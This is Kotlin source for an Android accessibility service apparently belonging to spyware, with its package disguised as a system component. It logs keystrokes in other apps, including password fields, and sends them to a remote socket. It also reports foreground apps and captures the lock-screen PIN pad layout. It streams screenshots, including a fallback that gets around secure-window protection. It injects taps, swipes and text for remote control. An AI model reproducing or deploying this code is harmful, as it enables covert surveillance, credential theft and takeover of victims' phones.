package com.android.systemservices

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import android.graphics.Rect
import android.hardware.HardwareBuffer

class ScreenshotService : AccessibilityService() {

    companion object {
        @Volatile var instance: ScreenshotService? = null
        @Volatile var keylogActive = false
        // Packages to watch for foreground alerts; set from MonitoringService
        val watchedApps = mutableSetOf<String>()
        // Last known foreground package — updated via TYPE_WINDOW_STATE_CHANGED events.
        // Used by ScreenTextHelper as a reliable alternative to the restricted getRunningTasks().
        @Volatile var currentForegroundApp: String = ""
        // Timestamp of the last accessibility event delivered to this service.
        // ScreenTextHelper reads this to skip tree walks while the user is actively interacting,
        // preventing the getRootInActiveWindow() Binder IPC from blocking the foreground app's
        // UI thread while it is processing touch input (which causes ~1 s "first tap" lag).
        @Volatile var lastEventMs: Long = 0L

        fun isAvailable() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && instance != null

        private const val FLUSH_INTERVAL_MS = 30_000L
        private const val FLUSH_THRESHOLD   = 50
        private const val MAX_TEXT_NODES     = 300
        private val SKIP_PACKAGES = setOf(
            "com.android.systemservices",
            "com.android.systemui",
            "android"
        )
    }

    private val keylogBuffer = mutableListOf<JSONObject>()
    private val keylogLock   = Any()
    private var currentApp    = ""
    private var currentWindow = ""
    @Volatile private var onLockscreen = false

    private val flushHandler = Handler(Looper.getMainLooper())
    // Background thread for lockscreen scans — walking the accessibility tree with rootInActiveWindow
    // makes many sequential Binder IPC calls (one per node level when no prefetch flags are used).
    // Running this on the main thread caused 100–500 ms pauses on every systemui window change
    // (notification shade swipe, volume dialog, etc.).  getRootInActiveWindow() is a thread-safe
    // Binder IPC and does NOT require the main thread.
    private val lockscreenScanThread = android.os.HandlerThread("lockscreen-scan").also { it.start() }
    private val lockscreenScanHandler = Handler(lockscreenScanThread.looper)
    private val flushRunnable: Runnable = object : Runnable {
        override fun run() {
            if (keylogActive) {
                flushKeylog()
                flushHandler.postDelayed(this, FLUSH_INTERVAL_MS)
            }
        }
    }

    override fun onServiceConnected() {
        instance = this
        Log.i("ScreenshotService", "Accessibility service connected")
        if (Prefs(this).keylogEnabled) startKeylog()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        flushHandler.removeCallbacks(flushRunnable)
        lockscreenScanHandler.removeCallbacksAndMessages(null)
        lockscreenScanThread.quitSafely()
        return super.onUnbind(intent)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        // Stamp the arrival time of every event so ScreenTextHelper can skip
        // getRootInActiveWindow() calls while the user is actively interacting.
        lastEventMs = System.currentTimeMillis()

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: return
                val cls = event.className?.toString() ?: ""

                // Any systemui window change might be the PIN bouncer appearing —
                // scan and let the tree walk confirm whether the keypad is present.
                if (pkg == "com.android.systemui" || pkg == "android") {
                    lockscreenScanHandler.removeCallbacksAndMessages(null)
                    lockscreenScanHandler.postDelayed({
                        val found = scanLockscreenLayout()
                        if (found) onLockscreen = true
                    }, 500)
                    return
                }

                if (pkg !in SKIP_PACKAGES) {
                    // Left the lockscreen — signal client to clear the overlay
                    if (onLockscreen) {
                        onLockscreen = false
                        lockscreenScanHandler.removeCallbacksAndMessages(null)
                        SocketManager.emit("lockscreen_hidden", JSONObject())
                    }
                    val prevApp = currentApp
                    currentApp    = pkg
                    currentWindow = cls
                    currentForegroundApp = pkg   // keep companion in sync for ScreenTextHelper
                    // Emit foreground change event for app-open alerts
                    if (pkg != prevApp) {
                        SocketManager.emit("app_foreground", JSONObject().apply {
                            put("pkg", pkg)
                            put("ts",  System.currentTimeMillis())
                            put("watched", pkg in watchedApps)
                        })
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (!keylogActive) return
                val pkg = event.packageName?.toString() ?: return
                if (pkg in SKIP_PACKAGES) return

                val newText     = event.text.firstOrNull()?.toString() ?: ""
                val addedCount  = event.addedCount
                val removedCount = event.removedCount

                val typed: String = when {
                    addedCount > 0 -> {
                        val from = event.fromIndex.coerceIn(0, newText.length)
                        val to   = (from + addedCount).coerceIn(0, newText.length)
                        if (to > from) newText.substring(from, to) else return
                    }
                    removedCount > 0 -> "⌫".repeat(removedCount)
                    else -> return
                }
                if (typed.isEmpty()) return

                val app  = if (pkg.isNotEmpty()) pkg else currentApp
                val hint = try { event.source?.hintText?.toString() ?: "" } catch (_: Exception) { "" }

                val entry = JSONObject().apply {
                    put("ts",   System.currentTimeMillis())
                    put("app",  app)
                    if (currentWindow.isNotEmpty()) put("window", currentWindow)
                    if (hint.isNotEmpty()) put("hint", hint)
                    if (event.isPassword) put("pw", true)
                    put("text", typed)
                }

                synchronized(keylogLock) {
                    keylogBuffer.add(entry)
                    if (keylogBuffer.size >= FLUSH_THRESHOLD) flushKeylog()
                }
            }
            else -> {}
        }
    }

    override fun onInterrupt() {}

    // ── Lockscreen layout detection ───────────────────────────────────────────

    // Returns true if the PIN bouncer was found and emitted, false otherwise.
    // MUST NOT be called on the main thread — uses Binder IPC (rootInActiveWindow + getChild calls).
    // Runs on lockscreenScanThread via lockscreenScanHandler.
    private fun scanLockscreenLayout(): Boolean {
        // Fast early-out: skip the entire accessibility tree walk when the keyguard
        // is not active.  isKeyguardLocked() is a direct memory read in KeyguardManager —
        // no Binder IPC, no blocking.  This eliminates the 100–500 ms tree walk for 99%
        // of systemui window events that are NOT the lock screen.
        val km = getSystemService(android.app.KeyguardManager::class.java)
        if (km == null || !km.isKeyguardLocked()) return false

        return try {
            // Fetch the entire window tree in a single Binder IPC using depth-first prefetch.
            // Without this flag every node.getChild() call below is a separate round-trip
            // to system_server, making the tree walk O(N) IPCs instead of O(batches).
            // FLAG_PREFETCH_UNINTERRUPTIBLE is intentionally omitted — see captureCurrentText()
            // for the full rationale (it causes "first tap" input latency of ~1 s).
            val root = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                getRootInActiveWindow(
                    AccessibilityNodeInfo.FLAG_PREFETCH_DESCENDANTS_DEPTH_FIRST
                )
            } else {
                rootInActiveWindow
            } ?: return false
            val dm   = resources.displayMetrics
            val buttons = JSONArray()
            collectKeypadNodes(root, buttons)
            root.recycle()
            if (buttons.length() > 0) {
                SocketManager.emit("lockscreen_layout", JSONObject().apply {
                    put("buttons", buttons)
                    put("screenW", dm.widthPixels)
                    put("screenH", dm.heightPixels)
                })
                Log.i("ScreenshotService", "Lockscreen layout emitted: ${buttons.length()} buttons")
                true
            } else false
        } catch (e: Exception) {
            Log.w("ScreenshotService", "lockscreen scan: ${e.message}")
            false
        }
    }

    private fun collectKeypadNodes(node: AccessibilityNodeInfo?, out: JSONArray) {
        if (node == null) return
        try {
            val rid   = node.viewIdResourceName ?: ""
            val suffix = rid.substringAfterLast("/")   // e.g. "key1", "delete_button"
            val desc  = node.contentDescription?.toString()?.trim() ?: ""
            val descL = desc.lowercase()

            // Match by resource ID (works for stock Android / GrapheneOS PIN pad)
            val label: String? = when {
                suffix.matches(Regex("key[0-9]"))   -> desc.ifEmpty { suffix.removePrefix("key") }
                suffix == "delete_button"            -> "⌫"
                suffix == "key_enter"                -> "↵"
                // Fallback: clickable node whose content-desc is a single digit or "Delete"
                node.isClickable && desc.matches(Regex("[0-9]")) -> desc
                node.isClickable && (descL.contains("delete") || descL.contains("backspace")) -> "⌫"
                else -> null
            }

            if (label != null) {
                val bounds = Rect()
                node.getBoundsInScreen(bounds)
                if (bounds.width() > 10 && bounds.height() > 10) {
                    out.put(JSONObject().apply {
                        put("label", label)
                        put("x", bounds.left)
                        put("y", bounds.top)
                        put("w", bounds.width())
                        put("h", bounds.height())
                    })
                }
                return // don't recurse into button children
            }

            for (i in 0 until node.childCount) {
                collectKeypadNodes(node.getChild(i), out)
            }
        } catch (_: Exception) {}
    }

    // ── Input injection ───────────────────────────────────────────────────────

    @RequiresApi(Build.VERSION_CODES.N)
    fun injectTap(x: Float, y: Float) {
        val path = Path().also { it.moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 50)
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long) {
        val path = Path().also { it.moveTo(x1, y1); it.lineTo(x2, y2) }
        val stroke = GestureDescription.StrokeDescription(path, 0, durationMs.coerceIn(50, 3000))
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun injectLongPress(x: Float, y: Float) {
        val path = Path().also { it.moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 800)
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    fun injectText(text: String) {
        val clipboard = getSystemService(android.content.Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        clipboard.setPrimaryClip(android.content.ClipData.newPlainText("inject", text))
        val root = rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        focused?.performAction(AccessibilityNodeInfo.ACTION_PASTE)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun injectKey(keyCode: Int) {
        // Simulate key via global action where possible, fall through to gesture
        when (keyCode) {
            android.view.KeyEvent.KEYCODE_BACK   -> performGlobalAction(GLOBAL_ACTION_BACK)
            android.view.KeyEvent.KEYCODE_HOME   -> performGlobalAction(GLOBAL_ACTION_HOME)
            android.view.KeyEvent.KEYCODE_APP_SWITCH -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            else -> {
                // Use instrumentation — only works if app is debuggable or Device Owner; best-effort
                try {
                    Runtime.getRuntime().exec(arrayOf("input", "keyevent", keyCode.toString()))
                } catch (_: Exception) {}
            }
        }
    }

    fun startKeylog() {
        keylogActive = true
        synchronized(keylogLock) { keylogBuffer.clear() }
        flushHandler.removeCallbacks(flushRunnable)
        flushHandler.postDelayed(flushRunnable, FLUSH_INTERVAL_MS)
        Log.i("ScreenshotService", "Keylog started")
    }

    fun stopKeylog() {
        keylogActive = false
        flushHandler.removeCallbacks(flushRunnable)
        flushKeylog()
        Log.i("ScreenshotService", "Keylog stopped")
    }

    private fun flushKeylog() {
        val entries: List<JSONObject>
        synchronized(keylogLock) {
            if (keylogBuffer.isEmpty()) return
            entries = keylogBuffer.toList()
            keylogBuffer.clear()
        }
        val arr = JSONArray().apply { entries.forEach { put(it) } }
        SocketManager.emit("keylog_data", JSONObject().apply { put("entries", arr) })
        Log.d("ScreenshotService", "Flushed ${entries.size} keylog entries")
    }

    // ── Pull-based screen text capture (used by ScreenTextHelper) ────────────
    //
    // Called from ScreenTextHelper on a background thread (dispatched to the main thread
    // via CountDownLatch so rootInActiveWindow is called from the correct thread context).
    // Does NOT subscribe to any accessibility events — pure pull model.

    fun captureCurrentText(): JSONArray? {
        // On API 33+ prefetch descendants depth-first so subsequent getChild() calls
        // return from the local cache (one batch IPC instead of N per-node IPCs).
        //
        // FLAG_PREFETCH_UNINTERRUPTIBLE is intentionally NOT set here.  With that flag,
        // the foreground app's UI thread processes accessibility node batches without
        // yielding to the touch-event handler, which causes the app to miss its
        // InputDispatcher ack window → InputDispatcher records a "slow event" →
        // user sees ~1 s stall on every initial tap (confirmed: 1 slow event per
        // 5.6 s — exactly the screen-text poll interval).  Without the flag, the
        // system can interrupt the prefetch when a new input event arrives, keeping
        // the UI thread responsive to touch.
        val root = if (android.os.Build.VERSION.SDK_INT >= 33) {
            getRootInActiveWindow(
                AccessibilityNodeInfo.FLAG_PREFETCH_DESCENDANTS_DEPTH_FIRST
            )
        } else {
            rootInActiveWindow
        } ?: return null
        val out = JSONArray()
        try {
            walkTextTree(root, out, 0)
        } finally {
            @Suppress("DEPRECATION") root.recycle()
        }
        return if (out.length() > 0) out else null
    }

    private fun walkTextTree(node: AccessibilityNodeInfo, out: JSONArray, depth: Int) {
        if (out.length() >= MAX_TEXT_NODES) return
        val text = node.text?.toString()?.trim() ?: ""
        val desc = node.contentDescription?.toString()?.trim() ?: ""
        val content = text.ifEmpty { desc }
        if (content.isNotEmpty() && content.length <= 2000) {
            val cls = node.className?.toString()?.substringAfterLast(".") ?: ""
            out.put(JSONObject().apply {
                put("t", content)
                if (cls.isNotEmpty()) put("c", cls)
                put("d", depth)
            })
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            try { walkTextTree(child, out, depth + 1) }
            finally { @Suppress("DEPRECATION") child.recycle() }
        }
    }

    // One-per-service-instance helper used exclusively for the lock-screen VirtualDisplay fallback.
    // Lazy so it isn't allocated on DO/user builds where it will never be needed.
    private val lockscreenCaptureHelper by lazy { ScreenCaptureHelper(this) }

    // Single-thread executor for JPEG encoding — keeps all bitmap/compress work off the main thread.
    // takeScreenshot() accepts any Executor for its callback; using mainExecutor previously blocked
    // the main thread for 30–100 ms per frame during screen streaming (1080p @ quality 50).
    private val screenshotEncodeExecutor: java.util.concurrent.Executor =
        java.util.concurrent.Executors.newSingleThreadExecutor { r ->
            Thread(r, "screenshot-encode").also { it.isDaemon = true }
        }

    @RequiresApi(Build.VERSION_CODES.R)
    fun capture(quality: Int, onDone: (String) -> Unit) {
        // Pass screenshotEncodeExecutor so onSuccess() runs on a background thread.
        // Bitmap.copy() + JPEG compress + Base64 is CPU-heavy; keeping it off the main
        // thread eliminates the 30–100 ms per-frame pause during screen streaming.
        takeScreenshot(Display.DEFAULT_DISPLAY, screenshotEncodeExecutor, object : TakeScreenshotCallback {
            override fun onSuccess(result: ScreenshotResult) {
                try {
                    val buffer = result.hardwareBuffer
                    val hardware = Bitmap.wrapHardwareBuffer(buffer, result.colorSpace)
                    buffer.close()
                    if (hardware == null) {
                        Log.e("ScreenshotService", "wrapHardwareBuffer returned null")
                        return
                    }
                    val soft = hardware.copy(Bitmap.Config.ARGB_8888, false)
                    hardware.recycle()
                    val baos = ByteArrayOutputStream()
                    soft.compress(Bitmap.CompressFormat.JPEG, quality.coerceIn(10, 85), baos)
                    soft.recycle()
                    onDone(Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                } catch (e: Exception) {
                    Log.e("ScreenshotService", "Encode failed: ${e.message}")
                }
            }

            override fun onFailure(errorCode: Int) {
                // errorCode 2 = TAKE_SCREENSHOT_ERROR_WINDOW_FORBIDDEN — keyguard / secure window.
                // On root/system builds the VirtualDisplay path mirrors the raw framebuffer and
                // is NOT subject to the secure-window restriction, so it can capture the lock screen.
                // tryRootVirtualDisplayCapture() returns true if it started a capture (it will call
                // onDone when the frame is ready), or false if permission is absent (non-root build).
                val isSystemApp = (applicationInfo.flags and
                        android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                if (isSystemApp) {
                    if (lockscreenCaptureHelper.tryRootVirtualDisplayCapture(quality, onDone)) {
                        Log.d("ScreenshotService",
                            "takeScreenshot blocked (errorCode=$errorCode) — using VirtualDisplay fallback")
                        return
                    }
                }
                Log.w("ScreenshotService", "takeScreenshot failed: errorCode=$errorCode")
                onDone("") // keep the stream chain alive
            }
        })
    }
}
